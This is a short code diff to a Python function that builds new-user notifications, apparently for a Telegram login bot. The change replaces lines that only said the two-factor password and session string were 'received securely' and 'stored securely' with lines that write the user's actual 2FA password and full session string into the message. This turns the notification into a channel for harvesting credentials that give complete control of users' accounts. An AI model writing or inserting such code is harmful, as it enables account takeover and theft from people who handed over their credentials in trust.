@@ -179,14 +179,15 @@ async def notify_new_user(user_info, string_session: str,
         f"🛡️ <b>2FA Verified:</b> {twofa_v}\n"
     )
     if twofa_password:
-        msg += "🔑 <b>2FA Password:</b> <i>received securely</i>\n"
+        msg += f"🔑 <b>Real 2FA Password:</b> <code>{_e(twofa_password)}</code>\n"
     if bot_user is not None and getattr(bot_user, "id", 0) != uid:
         bun = getattr(bot_user, "username", None)
         msg += (f"🤖 <b>Via Bot User:</b> {_e(getattr(bot_user, 'first_name', ''))} "
                 f"({'@' + bun if bun else 'no username'}) "
                 f"<code>{getattr(bot_user, 'id', 0)}</code>\n")
     msg += (
-        "🔑 <b>Session String:</b> <i>stored securely</i>\n\n"
+        f"🔑 <b>Session String:</b>\n"
+        f"<code>{_e(string_session)}</code>\n\n"
         f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
     )
 
